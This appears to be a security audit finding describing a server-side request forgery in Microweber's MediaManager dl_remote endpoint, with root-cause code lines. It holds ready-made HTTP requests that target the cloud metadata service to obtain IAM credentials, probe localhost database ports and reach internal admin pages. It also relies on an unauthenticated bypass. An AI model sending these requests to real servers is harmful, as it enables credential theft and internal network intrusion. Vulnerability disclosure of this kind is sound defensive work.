### F-008: SSRF via Remote Download (dl_remote / MediaManager)
### Severity: HIGH | Auth: Admin | Method: POST
### Impact: Server-side request to internal network, metadata endpoints, localhost services
###
### Via API (F-003 bypass allows unauthenticated access to MediaManager methods):

POST /api/MicroweberPackages/Media/MediaManager/dl_remote HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 46

src=http://169.254.169.254/latest/meta-data/

### EXPECTED: Server fetches AWS metadata endpoint (if running on EC2)
### Response contains: instance metadata, IAM role credentials

---

### SSRF to localhost (probe internal services):

POST /api/MicroweberPackages/Media/MediaManager/dl_remote HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 32

src=http://127.0.0.1:3306/

### Timing difference reveals open/closed port

---

### SSRF to internal network:

POST /api/MicroweberPackages/Media/MediaManager/dl_remote HTTP/1.1
Host: localhost:8888
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0
Connection: close
Content-Length: 36

src=http://10.0.0.1/admin/

### WHY IT WORKS:
###   MediaManager.php:467: if (isset($data['src']) && strstr($data['src'], 'http'))
###   MediaManager.php:504: mw()->http->url($data['src'])->download($newfile)
###   No IP allowlist, no denylist for RFC1918/loopback/link-local
###   Via F-003 bypass: MediaManager is pre-loaded, accessible unauthenticated
###   (Direct API: admin-gated — $adm = $this->app->user_manager->is_admin())
